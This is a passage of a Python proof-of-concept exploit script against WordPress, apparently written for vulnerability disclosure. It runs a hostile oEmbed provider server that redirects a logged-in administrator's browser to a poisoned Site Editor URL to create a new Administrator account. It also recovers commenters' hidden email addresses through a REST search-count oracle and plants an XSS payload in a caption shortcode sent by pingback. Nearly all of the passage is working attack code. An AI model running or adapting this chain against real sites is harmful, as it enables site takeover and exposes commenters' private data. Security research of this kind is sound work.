    def __init__(self, target: str, provider_origin: str, browser_origin: str, case: str, marker: str, username: str, email: str, password: str, editor_entity: str = "wp_navigation"):
        self.target = target
        self.provider_origin = provider_origin
        self.browser_origin = browser_origin
        self.case = case
        self.marker = marker
        self.username = username
        self.email = email
        self.password = password
        if editor_entity not in ("wp_navigation", "wp_block"):
            raise ProofError("Unsupported Site Editor entity route")
        self.editor_entity = editor_entity
        self.events: list[dict] = []
        self.lock = threading.Lock()

    def record(self, handler, marker: str) -> None:
        split = urlsplit(handler.path)
        with self.lock:
            self.events.append(
                {
                    "path": split.path,
                    "marker": marker,
                    "host": handler.headers.get("Host"),
                    "referer": handler.headers.get("Referer"),
                    "sec_fetch_dest": handler.headers.get("Sec-Fetch-Dest"),
                    "sec_fetch_site": handler.headers.get("Sec-Fetch-Site"),
                    "cookie_present": bool(handler.headers.get("Cookie")),
                }
            )


class ProviderServer(ThreadingHTTPServer):
    daemon_threads = True

    def __init__(self, address, state: ProviderState):
        self.state = state
        super().__init__(address, ProviderHandler)

    def handle_error(self, _request, _client_address):
        # Headless Chromium routinely closes keep-alive sockets during
        # navigation.  This is expected and not a provider failure.
        pass


class ProviderHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *_args):
        pass

    def send_bytes(self, body, mime="text/html; charset=utf-8", status=200, headers=None):
        if isinstance(body, str):
            body = body.encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", mime)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        for key, value in (headers or {}).items():
            self.send_header(key, value)
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        state: ProviderState = self.server.state
        split = urlsplit(self.path)
        if split.path == "/b":
            # The classic-widget MediaElement label sink requests this as an image;
            # its error handler then navigates to the same audited redirect.
            self.path = "/bounce?" + urlencode(
                {"case": state.case, "marker": state.marker}
            )
            split = urlsplit(self.path)
        query = parse_qs(split.query, keep_blank_values=True)
        case = query.get("case", [state.case])[0]
        marker = query.get("marker", [""])[0]
        prefix = state.case + "_"
        if case.startswith(prefix):
            marker = case[len(prefix):]
            case = state.case
        state.record(self, marker)
        if marker and marker != state.marker:
            self.send_bytes("unknown marker", status=404)
            return
        if split.path == "/status":
            with state.lock:
                body = json.dumps({"events": list(state.events)})
            self.send_bytes(body, "application/json; charset=utf-8")
            return
        if split.path == "/doc":
            href = state.provider_origin + "/api?" + urlencode({"case": case, "marker": marker})
            self.send_bytes(
                '<!doctype html><meta charset="utf-8"><link rel="alternate" '
                'type="application/json+oembed" href="' + html.escape(href, quote=True) + '">'
            )
            return
        if split.path == "/api":
            frame = state.browser_origin + "/frame?" + urlencode({"case": case, "marker": marker})
            payload = (
                '<blockquote><a href="' + html.escape(frame, quote=True) + '">fallback</a></blockquote>'
                '<iframe src="' + html.escape(frame, quote=True) + '" width="420" height="260"></iframe>'
            )
            self.send_bytes(
                json.dumps(
                    {
                        "version": "1.0", "type": "rich",
                        "provider_name": "WPRC local provider",
                        "width": 420, "height": 260, "html": payload,
                    }
                ),
                "application/json; charset=utf-8",
            )
            return
        if split.path == "/frame":
            bounce = state.browser_origin + "/bounce?" + urlencode({"case": case, "marker": marker})
            script = r"""<!doctype html><title>provider frame</title><script>
            let sent=false; const target=%s;
            const fire=()=>{if(sent)return;const secret=new URLSearchParams(location.hash.replace(/^#\??/,'')).get('secret');
              if(!secret)return;sent=true;focus();parent.postMessage({secret,message:'link',value:target},'*');};
            addEventListener('message',e=>{if(e.data&&e.data.message==='ready')fire();});
            addEventListener('load',()=>setTimeout(fire,1200));
            </script><p>provider frame</p>""" % json.dumps(bounce)
            self.send_bytes(script)
            return
        if split.path == "/bounce":
            fields = (
                "_method%3DPOST%26username%3D" + quote(state.username, safe="")
                + "%26email%3D" + quote(quote(state.email, safe=""), safe="")
                + "%26password%3D" + quote(state.password, safe="")
                + "%26roles%255B0%255D%3Dadministrator"
            )
            entity = state.editor_entity
            if case == "admin_create_pretty_chain":
                poisoned = f"/{entity}/1%2F..%2F..%2Fusers%3F" + fields
            else:
                poisoned = f"/{entity}/1%26rest_route%3D%2Fwp%2Fv2%2Fusers%26" + fields
            params = {"p": poisoned}
            if entity == "wp_block":
                params["canvas"] = "edit"
            location = state.target + "/wp-admin/site-editor.php?" + urlencode(params)
            self.send_bytes(b"", status=302, headers={"Location": location})
            return
        self.send_bytes("not found", status=404)


def start_provider(state: ProviderState, hosts: tuple[str, str], port: int):
    servers = []
    threads = []
    try:
        for host in dict.fromkeys(hosts):
            server = ProviderServer((host, port), state)
            thread = threading.Thread(target=server.serve_forever, daemon=True)
            thread.start()
            servers.append(server)
            threads.append(thread)
        return servers, threads
    except Exception:
        stop_provider(servers, threads)
        raise


def stop_provider(servers, threads) -> dict:
    errors = []
    for server in servers:
        try:
            server.shutdown()
            server.server_close()
        except Exception as exc:
            errors.append(type(exc).__name__)
    for thread in threads:
        thread.join(timeout=3)
    return {"servers_closed": len(servers), "threads_stopped": all(not item.is_alive() for item in threads), "errors": errors}


def detect_permalink(session, base: str, post_id: int) -> str:
    page = session.get(base + "/?p=" + str(post_id), timeout=30)
    for attrs in parse_page(page.text).link_tags:
        if attrs.get("rel") == "https://api.w.org/" and attrs.get("href"):
            href = html.unescape(attrs["href"])
            if "rest_route=" in href:
                return "plain"
            if "/wp-json/" in href:
                return "pretty"
    raise ProofError("Could not infer the REST root; pass --permalink plain or pretty")


def comment_avatar_hash(comment: dict) -> str | None:
    """Return the public SHA-256 Gravatar verifier for a REST comment."""
    for value in (comment.get("author_avatar_urls") or {}).values():
        match = re.search(r"/avatar/([0-9a-f]{64})(?:[/?]|$)", str(value), re.I)
        if match:
            return match.group(1).lower()
    return None


def visible_comment_text(comment: dict) -> str:
    content = comment.get("content") or {}
    return "\n".join(
        str(value)
        for value in (
            comment.get("author_name", ""),
            comment.get("author_url", ""),
            content.get("rendered", "") if isinstance(content, dict) else content,
            comment.get("link", ""),
        )
    )


def public_approved_comments(
    session, base: str, post_id: int | None, page: int = 1,
    include_id: int | None = None,
) -> tuple[list[dict], int, int]:
    params = {
        "rest_route": "/wp/v2/comments",
        "per_page": "100",
        "page": str(page),
        "_fields": "id,author_name,author_url,author_avatar_urls,content,link,type",
    }
    if post_id is not None:
        params["post"] = str(post_id)
    if include_id is not None:
        params["include"] = str(include_id)
        params["orderby"] = "include"
    response = session.get(
        base + "/",
        params=params,
        timeout=30,
    )
    if response.status_code != 200:
        raise ProofError("Could not enumerate public approved comments")
    rows = response.json()
    if not isinstance(rows, list):
        raise ProofError("Public comments endpoint returned an unexpected document")
    total = response.headers.get("X-WP-Total", "")
    total_pages = response.headers.get("X-WP-TotalPages", "")
    if not total.isdecimal() or not total_pages.isdecimal():
        raise ProofError("Public comments endpoint omitted numeric pagination headers")
    return rows, int(total), int(total_pages)


def comment_oracle_total(session, base: str, comment_id: int, guess: str) -> int:
    last_error: Exception | None = None
    for attempt in range(3):
        try:
            response = session.get(
                base + "/",
                params={
                    "rest_route": "/wp/v2/comments",
                    "include": str(comment_id),
                    "per_page": "1",
                    "search": guess,
                },
                timeout=30,
            )
            if response.status_code == 200:
                total = response.headers.get("X-WP-Total")
                if total is not None and total.isdecimal():
                    return int(total)
                last_error = ProofError("numeric X-WP-Total missing")
            else:
                last_error = ProofError(f"HTTP {response.status_code}")
        except Exception as exc:
            last_error = exc
        if attempt < 2:
            time.sleep(0.15 * (attempt + 1))
    raise ProofError(
        f"Comment oracle failed after three attempts for a {len(guess)}-byte guess "
        f"({type(last_error).__name__ if last_error else 'unknown error'})"
    ) from last_error


def extend_comment_oracle(
    base: str, comment_id: int, seed: str, alphabet: str,
    side: str, workers: int,
) -> tuple[str | None, int]:
    guesses = [seed + char if side == "right" else char + seed for char in alphabet]
    worker_local = threading.local()
    worker_sessions = []
    worker_sessions_lock = threading.Lock()

    def probe(guess: str) -> int:
        if not hasattr(worker_local, "session"):
            worker_local.session = http_session(base)
            with worker_sessions_lock:
                worker_sessions.append(worker_local.session)
        return comment_oracle_total(worker_local.session, base, comment_id, guess)

    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as pool:
            totals = list(pool.map(probe, guesses))
    finally:
        for worker_session in worker_sessions:
            worker_session.close()
    hits = [guess for guess, total in zip(guesses, totals) if total > 0]
    if len(hits) > 1:
        raise ProofError(
            f"Ambiguous {side} hidden-email extension for comment {comment_id}"
        )
    return (hits[0] if hits else None), len(guesses)


def recover_approved_commenter(
    session, base: str, post_id: int, preferred_id: int | None,
    workers: int,
) -> dict:
    """Recover one approved commenter's hidden email via REST result totals.

    The public author name supplies the other half of the default prior-approval
    tuple.  The public SHA-256 avatar path independently verifies the recovered
    candidate before it is used.
    """
    log_progress(f"Looking for an approved public commenter on post {post_id}")
    def eligible(public_rows: list[dict]) -> list[dict]:
        return [
            row
            for row in public_rows
            if (preferred_id is None or int(row.get("id", 0)) == preferred_id)
            and row.get("type") in (None, "comment")
            and row.get("author_name")
            and comment_avatar_hash(row)
            and "@" not in visible_comment_text(row)
        ]

    selected = None
    source_scope = None
    public_comment_count = 0
    for scope_name, scope_post in (("target_post", post_id), ("site_wide", None)):
        if scope_name == "site_wide":
            log_info("No suitable commenter on the target post; checking site-wide comments")
        page = 1
        while True:
            rows, total, total_pages = public_approved_comments(
                session, base, scope_post, page=page, include_id=preferred_id
            )
            public_comment_count = total
            candidates = eligible(rows)
            if candidates:
                selected = candidates[0]
                source_scope = scope_name
                break
            if preferred_id is not None or page >= total_pages:
                break
            if page >= MAX_COMMENT_DISCOVERY_PAGES:
                raise ProofError(
                    f"Public comment discovery exceeded {MAX_COMMENT_DISCOVERY_PAGES * 100} rows; "
                    "supply --comment-id for a direct lookup"
                )
            page += 1
        if selected is not None:
            break
    if selected is None or source_scope is None:
        raise ProofError(
            "No unambiguous public approved commenter with an avatar verifier was available"
        )
    chosen = selected
    comment_id = int(chosen["id"])
    log_progress(f"Recovering the hidden email for public comment {comment_id} ({source_scope})")
    expected_hash = comment_avatar_hash(chosen)
    if comment_oracle_total(session, base, comment_id, "@") != 1:
        raise ProofError("Chosen comment did not expose a unique hidden-email seed")

    request_count = 1
    seed = "@"
    domain_alphabet = string.ascii_lowercase + string.digits + ".-"
    # This covers ordinary mailbox names and avoids percent-decoding
    # ambiguity in the HTTP/REST boundary.  The public avatar hash rejects an
    # incomplete candidate; the script never silently guesses.
    local_alphabet = string.ascii_lowercase + string.digits + ".+-_"
    while len(seed) < 101:
        longer, probes = extend_comment_oracle(
            base, comment_id, seed, domain_alphabet, "right", workers
        )
        request_count += probes
        if longer is None:
            break
        seed = longer
        if len(seed) % 8 == 0:
            log_progress(f"Oracle: {request_count} requests (domain phase)")
    else:
        raise ProofError("Recovered email domain exceeded the comment column")
    while len(seed) < 101:
        longer, probes = extend_comment_oracle(
            base, comment_id, seed, local_alphabet, "left", workers
        )
        request_count += probes
        if longer is None:
            break
        seed = longer
        if len(seed) % 8 == 0:
            log_progress(f"Oracle: {request_count} requests (mailbox phase)")
    else:
        raise ProofError("Recovered email local part exceeded the comment column")

    recovered_hash = hashlib.sha256(seed.lower().strip().encode()).hexdigest()
    if recovered_hash != expected_hash:
        raise ProofError(
            "Recovered commenter email did not match the public avatar SHA-256 verifier"
        )
    log_ok(f"Email verifier matched after {request_count} oracle requests")
    return {
        "comment_id": comment_id,
        "author": str(chosen["author_name"]),
        "email": seed,
        "email_sha256": recovered_hash,
        "avatar_sha256": expected_hash,
        "hashes_match": True,
        "oracle_request_count": request_count,
        "public_comment_count": public_comment_count,
        "source_scope": source_scope,
    }


def submit_comment(session, base: str, post_id: int, content: str, author: str, email: str, website: str) -> dict:
    response = session.post(
        base + "/wp-comments-post.php",
        data={"comment": content, "author": author, "email": email, "url": website, "comment_post_ID": str(post_id), "comment_parent": "0", "submit": "Post Comment"},
        headers={"Referer": base + "/?p=" + str(post_id)},
        allow_redirects=False, timeout=30,
    )
    location = response.headers.get("Location", "")
    match = re.search(r"comment-(\d+)", urlsplit(location).fragment)
    return {"status": response.status_code, "location_path": urlsplit(location).path, "comment_id": int(match.group(1)) if match else None}


def cleanup_comment(admin, base: str, comment_id: int | None, marker: str) -> dict:
    result = {"comment_id": comment_id}
    page = admin.get(base + "/wp-admin/edit-comments.php", params={"s": marker, "comment_status": "all"}, timeout=30)
    matching_ids = sorted(
        {
            int(value)
            for value in re.findall(r"\bid=[\"']comment-(\d+)[\"']", page.text, flags=re.I)
        }
    )
    if comment_id is None:
        if not matching_ids:
            result.update({"absent_before": True, "absent_after": True, "completed": True})
            return result
        if len(matching_ids) != 1:
            result["completed"] = False
            result["error"] = "comment marker lookup was not unique"
            return result
        comment_id = matching_ids[0]
        result["comment_id"] = comment_id
        result["recovered_from_marker"] = True
    elif comment_id not in matching_ids:
        result.update({"absent_before": True, "absent_after": True, "completed": True})
        return result
    trash = find_action_link(page, "trashcomment", {"c": str(comment_id)})
    result["trash_link_present"] = bool(trash)
    if trash:
        result["trash_status"] = admin.get(trash, timeout=30).status_code
    page = admin.get(base + "/wp-admin/edit-comments.php", params={"comment_status": "trash", "s": marker}, timeout=30)
    delete = find_action_link(page, "deletecomment", {"c": str(comment_id)})
    result["delete_link_present"] = bool(delete)
    if delete:
        result["delete_status"] = admin.get(delete, timeout=30).status_code
    verify = admin.get(base + "/wp-admin/edit-comments.php", params={"s": marker, "comment_status": "all"}, timeout=30)
    result["absent_after"] = f'id="comment-{comment_id}"' not in verify.text and f"id='comment-{comment_id}'" not in verify.text
    result["completed"] = bool(result.get("trash_status") == 200 and result.get("delete_status") == 200 and result["absent_after"])
    return result


def sanitize_argv(argv: list[str]) -> list[str]:
    output = []
    hide_next = False
    for item in argv:
        if hide_next:
            output.append("<redacted>")
            hide_next = False
        elif item == "--comment-email":
            output.append(item)
            hide_next = True
        elif item.startswith("--comment-email="):
            output.append("--comment-email=<redacted>")
        else:
            output.append(item)
    return output


def mediaelement_track_carrier(browser_host: str, provider_port: int) -> str:
    sink = browser_host + ":" + str(provider_port)
    return (
        r"[caption width=1 caption=\74video\tclass=wp-video-shortcode\76"
        r"\74track\tsrc=x\tkind=captions\tsrclang=x\tlabel=\42"
        + r"&lt;img\tsrc=//"
        + sink
        + r"/b\tonerror=location=src&gt;\42\76\74/video\76/]"
        + r"[video src=/x.mp4]"
    )


def readonly_check(
    base: str,
    post_id: int | None,
    source_post_id: int | None,
    browser_host: str,
    provider_port: int,
) -> dict:
    result = {
        "case": "wprc_theme_and_renderer_reachability_check",
        "started_at": utc_now(),
        "site": base,
        "mutations": 0,
    }
    with http_session(base) as session:
        explicit_post = post_id is not None
        if not explicit_post:
            discovery = discover_target_post(session, base, "either")
            post_id = int(discovery["selected_post_id"])
            target_url = str(discovery["selected_url"])
        else:
            channels = public_object_channels(session, base, post_id)
            target_url = base + "/?p=" + str(post_id)
            discovery = {
                "mode": "explicit_override",
                "selected_post_id": post_id,
                "selection_reason": "--post-id override",
                "comment_status": channels["comment_status"],
                "ping_status": channels["ping_status"],
                "public_object": channels,
            }
        page = session.get(target_url, timeout=30)
        if page.status_code != 200:
            raise ProofError("Selected target post was not reachable")
        target_url = page.url
        route = detect_theme_route(session, base, page.text)
        required_channel = (
            "ping"
            if route["is_block_theme"] is False
            else "comment"
            if route["is_block_theme"] is True
            else None
        )
        status_key = required_channel + "_status" if required_channel else None
        selected_status = (
            discovery.get("selected_" + status_key, discovery.get(status_key))
            if status_key
            else None
        )
        if required_channel and selected_status != "open":
            if explicit_post:
                raise ProofError(
                    f"Explicit --post-id is not {required_channel}-open for the selected branch"
                )
            original_theme = (route["parent_theme"], route["child_theme"])
            discovery = discover_target_post(session, base, required_channel)
            post_id = int(discovery["selected_post_id"])
            target_url = str(discovery["selected_url"])
            page = session.get(target_url, timeout=30)
            if page.status_code != 200:
                raise ProofError("Branch-compatible target post was not reachable")
            target_url = page.url
            route = detect_theme_route(session, base, page.text)
            if (route["parent_theme"], route["child_theme"]) != original_theme:
                raise ProofError("Active theme fingerprint changed during target discovery")
        result.update(
            {
                "post_discovery": discovery,
                "target_post_id": post_id,
                "administrator_visit_url": target_url,
                "active_theme": route,
            }
        )
        if route["is_block_theme"] is False:
            reachability = classic_reachability(session, base, page.text)
            source = None
            source_error = None
            if reachability["supported"]:
                try:
                    source = build_pingback_source(
                        session,
                        base,
                        target_url,
                        post_id,
                        mediaelement_track_carrier(browser_host, provider_port),
                        source_post_id,
                    )
                except Exception as exc:
                    source_error = f"{type(exc).__name__}: {exc}"
            result.update(
                {
                    "branch": "classic_pingback_mediaelement",
                    "reachability": reachability,
                    "source_preflight": source,
                    "source_preflight_error": source_error,
                    "supported": bool(reachability["supported"] and source is not None),
                }
            )
        elif route["is_block_theme"] is True:
            reachability = block_reachability(session, base, page.text)
            result.update(
                {
                    "branch": "block_theme_guest_comment_oembed",
                    "reachability": reachability,
                    "supported": reachability["supported"],
                }
            )
        else:
            result.update(
                {
                    "branch": None,
                    "reachability": {
                        "supported": False,
                        "classification": "unsupported_classic_theme_renderer",
                        "refusal_reason": (
                            "The active theme did not expose a compatible block or classic route."
                        ),
                    },
                    "supported": False,
                }
            )
        result["finished_at"] = utc_now()
    return result


def main() -> int:
    parser = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Quick start:\n"
            "  python poc.py --site http://target.example --check\n"
            "  python poc.py --site http://target.example --run --evidence wprc-evidence.json\n"
            "No Administrator credential is supplied to the script. It prints the post URL to open\n"
            "in your own logged-in Administrator browser and polls the generated credential every\n"
            "30 seconds. After success, delete the reported temporary user in that browser.\n"
            "The target post, active parent/child theme, and compatible core editor route are detected\n"
            "automatically. Theme hashes are recorded as evidence, not used as execution gates.\n"
            "--post-id, --source-post-id, and --comment-id are optional deterministic overrides.\n"
            "Automatic cleanup of the proof plugin and guest artifact is opt-in via --cleanup."
        ),
    )
    parser.add_argument(
        "--site", "--target", dest="target", metavar="URL", default="http://127.0.0.9:9143",
        help="WordPress site origin; any reachable http(s) host is allowed",
    )
    parser.add_argument("--post-id", type=int, help="Optional public target override; branch-specific comment/ping status is verified")
    parser.add_argument("--source-post-id", type=int, help="Optional same-site pingback source override for the classic-theme branch")
    parser.add_argument("--comment-id", type=int, help="Preferred public approved comment for automatic identity recovery; may belong to another post")
    parser.add_argument("--comment-author", help=argparse.SUPPRESS)
    parser.add_argument("--comment-email", help=argparse.SUPPRESS)
    parser.add_argument("--comment-url", default="", help=argparse.SUPPRESS)
    parser.add_argument("--oracle-workers", type=int, default=12, help=argparse.SUPPRESS)
    parser.add_argument("--permalink", choices=("auto", "plain", "pretty"), default="auto", help=argparse.SUPPRESS)
    parser.add_argument("--provider-port", type=int, default=8080, help=argparse.SUPPRESS)
    parser.add_argument(
        "--provider-bind",
        default="",
        help="Bind the local JS/oEmbed provider to this host (e.g. 0.0.0.0 to serve externally)",
    )
    parser.add_argument("--browser-provider-host", default="127.0.0.7", help=argparse.SUPPRESS)
    parser.add_argument("--poll-interval-seconds", type=int, default=30, help="Seconds between generated-credential checks (default: 30)")
    parser.add_argument("--trigger-timeout-seconds", type=int, default=900, help="Maximum time to wait for the tester's Administrator page view")
    parser.add_argument("--comment-flood-wait-seconds", type=int, default=16, help=argparse.SUPPRESS)
    parser.add_argument(
        "--cleanup",
        action="store_true",
        help="Automatically remove the proof plugin and guest artifact after the run (default: report manual steps)",
    )
    parser.add_argument("--evidence", help="Optional JSON evidence output path")
    mode = parser.add_mutually_exclusive_group()
    mode.add_argument("--check", action="store_true", help="Read-only theme/renderer reachability check (default)")
    mode.add_argument("--run", action="store_true", help="Perform the active replay")
    args = parser.parse_args()

    try:
        base = origin(args.target).rstrip("/")
    except ProofError as exc:
        parser.error(str(exc))
    target = urlsplit(base)
    supplied_target = urlsplit(args.target)
    if supplied_target.path not in ("", "/") or supplied_target.query or supplied_target.fragment:
        parser.error("--site must be an origin without a path, query, or fragment")
    if args.provider_port not in (80, 443, 8080):
        parser.error("--provider-port must be a stock wp_http_validate_url allowed port: 80, 443, or 8080")
    target_port = target.port or 80
    if args.provider_port == target_port:
        parser.error("Provider and target must use different origins")
    if args.poll_interval_seconds < 5:
        parser.error("--poll-interval-seconds must be at least 5")
    if args.trigger_timeout_seconds < args.poll_interval_seconds:
        parser.error("--trigger-timeout-seconds must be at least one poll interval")
    if bool(args.comment_author) != bool(args.comment_email):
        parser.error("--comment-author and --comment-email must be supplied together")
    if args.comment_id is not None and args.comment_id < 1:
        parser.error("--comment-id must be positive")
    if args.post_id is not None and args.post_id < 1:
        parser.error("--post-id must be positive")
    if args.source_post_id is not None and args.source_post_id < 1:
        parser.error("--source-post-id must be positive")
    if args.comment_flood_wait_seconds < 0:
        parser.error("--comment-flood-wait-seconds cannot be negative")
    if args.oracle_workers < 1 or args.oracle_workers > 32:
        parser.error("--oracle-workers must be between 1 and 32")
    provider_origin = f"http://{target.hostname}:{args.provider_port}"
    browser_origin = f"http://{args.browser_provider_host}:{args.provider_port}"
    plan = {
        "mode": "active" if args.run else "dry-run",
        "target": base,
        "provider_origin": provider_origin,
        "browser_provider_origin": browser_origin,
        "post_id": args.post_id if args.post_id is not None else "auto",
        "source_post_id": args.source_post_id if args.source_post_id is not None else "auto",
        "post_discovery": "explicit_override" if args.post_id is not None else "anonymous_rest",
        "trigger_mode": "tester_admin_browser",
        "commenter_identity": (
            "explicit_override" if args.comment_author else "anonymous_rest_count_oracle"
        ),
        "theme_routing": "automatic_runtime_detected_block_or_classic_renderer",
        "mutations": ["one guest artifact", "one temporary Administrator", "one temporary proof plugin"],
        "automatic_cleanup": (
            ["proof plugin via Plugins UI", "guest artifact via Comments UI"]
            if args.cleanup
            else "disabled; pass --cleanup to enable"
        ),
        "generated_user_cleanup": "manual in tester's existing Administrator browser",
    }
    if not args.run:
        try:
            checked = readonly_check(
                base,
                args.post_id,
                args.source_post_id,
                args.browser_provider_host,
                args.provider_port,
            )
            checked["plan"] = plan
        except Exception as exc:
            checked = {
                "case": "wprc_theme_and_renderer_reachability_check",
                "started_at": utc_now(),
                "site": base,
                "mutations": 0,
                "supported": False,
                "error": f"{type(exc).__name__}: {exc}",
                "plan": plan,
                "finished_at": utc_now(),
            }
        if args.evidence:
            output = Path(args.evidence).expanduser().resolve()
            output.write_text(json.dumps(checked, indent=2) + "\n", encoding="utf-8")
            log_info(f"Evidence written to {output}")
        reachability = checked.get("reachability") or {}
        if checked.get("error"):
            log_error(str(checked["error"]))
            return 1
        if checked.get("supported") is True:
            log_ok(f"Target supported: {reachability.get('classification')}")
            return 0
        log_error(
            "Target not supported: "
            + str(reachability.get("refusal_reason") or reachability.get("classification"))
        )
        return 2

    marker = "NC" + secrets.token_hex(6).upper()
    username = ("wprc" + marker).lower()
    email = username + "@example.test"
    password = "WPRC!" + secrets.token_urlsafe(18)
    permalink = args.permalink
    target_post_id = args.post_id
    target_visit_url = None
    evidence: dict[str, object] = {
        "case": "wprc_guest_passive_admin_rce",
        "started_at": utc_now(),
        "argv": sanitize_argv(sys.argv[1:]),
        "plan": plan,
        "marker": marker,
        "created_username": username,
        "created_email": email,
        "password_sha256": hashlib.sha256(password.encode()).hexdigest(),
        "password_not_stored": True,
    }
    servers = []
    threads = []
    injected_admin = None
    plugin_file = None
    comment_id = None
    comment_cleanup_marker = marker
    comment_attempted = False
    trigger_exposed = False
    chain_complete = False
    delivery_branch = None
    source = None
    source_preflight = None
    try:
        theme_route = None
        preflight = http_session(base)
        try:
            explicit_target = target_post_id is not None
            if not explicit_target:
                post_discovery = discover_target_post(preflight, base, "either")
                target_post_id = int(post_discovery["selected_post_id"])
                target_probe_url = str(post_discovery["selected_url"])
            else:
                channels = public_object_channels(preflight, base, target_post_id)
                target_probe_url = base + "/?p=" + str(target_post_id)
                post_discovery = {
                    "mode": "explicit_override",
                    "selected_post_id": target_post_id,
                    "selection_reason": "--post-id override",
                    "comment_status": channels["comment_status"],
                    "ping_status": channels["ping_status"],
                    "public_object": channels,
                }
            plan["post_id"] = target_post_id
            evidence["post_discovery"] = post_discovery
            response = preflight.get(target_probe_url, timeout=30)
            evidence["target_preflight"] = {"status": response.status_code, "server": response.headers.get("Server")}
            if response.status_code != 200:
                raise ProofError("Selected target post was not reachable")
            target_visit_url = response.url
            theme_route = detect_theme_route(preflight, base, response.text)
            required_channel = (
                "ping"
                if theme_route["is_block_theme"] is False
                else "comment"
                if theme_route["is_block_theme"] is True
                else None
            )
            status_key = required_channel + "_status" if required_channel else None
            selected_status = (
                post_discovery.get(
                    "selected_" + status_key, post_discovery.get(status_key)
                )
                if status_key
                else None
            )
            if required_channel and selected_status != "open":
                if explicit_target:
                    raise ProofError(
                        f"Explicit --post-id is not {required_channel}-open for the selected branch"
                    )
                original_theme = (
                    theme_route["parent_theme"],
                    theme_route["child_theme"],
                )
                post_discovery = discover_target_post(
                    preflight, base, required_channel
                )
                target_post_id = int(post_discovery["selected_post_id"])
                target_probe_url = str(post_discovery["selected_url"])
                response = preflight.get(target_probe_url, timeout=30)
                if response.status_code != 200:
                    raise ProofError("Branch-compatible target post was not reachable")
                target_visit_url = response.url
                theme_route = detect_theme_route(preflight, base, response.text)
                if (
                    theme_route["parent_theme"],
                    theme_route["child_theme"],
                ) != original_theme:
                    raise ProofError(
                        "Active theme fingerprint changed during target discovery"
                    )
                plan["post_id"] = target_post_id
                evidence["post_discovery"] = post_discovery
                evidence["target_preflight"] = {
                    "status": response.status_code,
                    "server": response.headers.get("Server"),
                }
            evidence["active_theme"] = theme_route
            if theme_route["is_block_theme"] is False:
                delivery_branch = "classic_pingback_mediaelement"
                reachability = classic_reachability(
                    preflight, base, response.text
                )
                evidence["classic_reachability"] = reachability
                if not reachability["supported"]:
                    raise ProofError(
                        "Refusing classic-theme state before mutation: "
                        + str(reachability.get("refusal_reason") or reachability["classification"])
                    )
                source_preflight = build_pingback_source(
                    preflight,
                    base,
                    target_visit_url,
                    target_post_id,
                    mediaelement_track_carrier(
                        args.browser_provider_host, args.provider_port
                    ),
                    args.source_post_id,
                )
                evidence["source_preflight"] = source_preflight
                source = source_preflight["selected"]["source_url"]
                comment_cleanup_marker = source_preflight["selected"][
                    "transport_nonce"
                ]
            elif theme_route["is_block_theme"] is True:
                delivery_branch = "block_theme_guest_comment_oembed"
                reachability = block_reachability(
                    preflight, base, response.text
                )
                evidence["block_reachability"] = reachability
                if not reachability["supported"]:
                    raise ProofError(
                        "Refusing incompatible block-theme state before mutation: "
                        + str(
                            reachability.get("refusal_reason")
                            or reachability["classification"]
                        )
                    )
            else:
                raise ProofError(
                    "The active theme did not expose a compatible block or classic route."
                )
            if permalink == "auto":
                permalink = detect_permalink(preflight, base, target_post_id)
        finally:
            preflight.close()
        evidence["permalink"] = permalink
        evidence["delivery_branch"] = delivery_branch
        plan["delivery_branch"] = delivery_branch
        log_progress(f"Target post {target_post_id} selected ({delivery_branch})")
        if delivery_branch == "classic_pingback_mediaelement":
            approved_identity = None
            plan["commenter_identity"] = "anonymous_cookie_free_pingback"
            plan["mutations"][0] = "one anonymous pingback"
            if args.cleanup:
                plan["automatic_cleanup"][1] = "pingback via Comments UI"
        elif args.comment_author:
            approved_identity = {
                "mode": "explicit_override",
                "comment_id": args.comment_id,
                "author": args.comment_author,
                "email": args.comment_email,
                "email_sha256": hashlib.sha256(
                    args.comment_email.lower().strip().encode()
                ).hexdigest(),
            }
        else:
            oracle = http_session(base)
            try:
                recovered = recover_approved_commenter(
                    oracle, base, target_post_id, args.comment_id, args.oracle_workers
                )
            finally:
                oracle.close()
            approved_identity = {"mode": "anonymous_rest_count_oracle", **recovered}
        if approved_identity is not None:
            evidence["approved_commenter_identity"] = {
                key: value
                for key, value in approved_identity.items()
                if key != "email"
            }
        case = "admin_create_pretty_chain" if permalink == "pretty" else "admin_create_chain"
        state = ProviderState(
            base, provider_origin, browser_origin, case, marker,
            username, email, password, theme_route["editor_entity"]
        )
        if args.provider_bind:
            provider_hosts = (args.provider_bind,)
        else:
            provider_hosts = (
                (args.browser_provider_host,)
                if delivery_branch == "classic_pingback_mediaelement"
                else (target.hostname, args.browser_provider_host)
            )
        servers, threads = start_provider(state, provider_hosts, args.provider_port)
        log_progress(
            f"Provider serving on port {args.provider_port} (bind: {', '.join(provider_hosts)})"
        )
        if delivery_branch == "block_theme_guest_comment_oembed":
            source = provider_origin + "/doc?case=" + case + "_" + marker
        evidence["source_url"] = source
        evidence["source_url_length"] = len(source)
        if delivery_branch == "classic_pingback_mediaelement":
            carrier = mediaelement_track_carrier(
                args.browser_provider_host, args.provider_port
            )
            evidence["carrier"] = {
                "kind": "one_ping_mediaelement_track_label",
                "length": len(carrier),
                "browser_sink": "//"
                + args.browser_provider_host
                + ":"
                + str(args.provider_port)
                + "/b",
            }
        else:
            content = (
                "before\n\n<strong><code>x</strong>\n\n"
                + source
                + "\n\n</code>\n\nafter "
                + marker
            )
        guest = http_session(base)
        try:
            comment_attempted = True
            if delivery_branch == "classic_pingback_mediaelement":
                evidence["submission"] = send_pingback(
                    guest, base, source, target_visit_url
                )
                if evidence["submission"]["fault"] is not None:
                    raise ProofError(
                        "Anonymous pingback was rejected: "
                        + json.dumps(evidence["submission"]["fault"], sort_keys=True)
                    )
                pingback = discover_pingback(
                    guest,
                    base,
                    target_post_id,
                    source_preflight["selected"]["transport_nonce"],
                )
                comment_id = int(pingback["id"])
                evidence["public_pingback"] = {
                    "id": comment_id,
                    "post": pingback.get("post"),
                    "publicly_rendered": pingback.get("publicly_rendered"),
                    "public_type_class": pingback.get("public_type_class"),
                    "public_rest_type": pingback.get("public_rest_type"),
                    "public_type_evidence": pingback.get("public_type_evidence"),
                    "class_tokens": pingback.get("class_tokens"),
                    "author_name": pingback.get("author_name"),
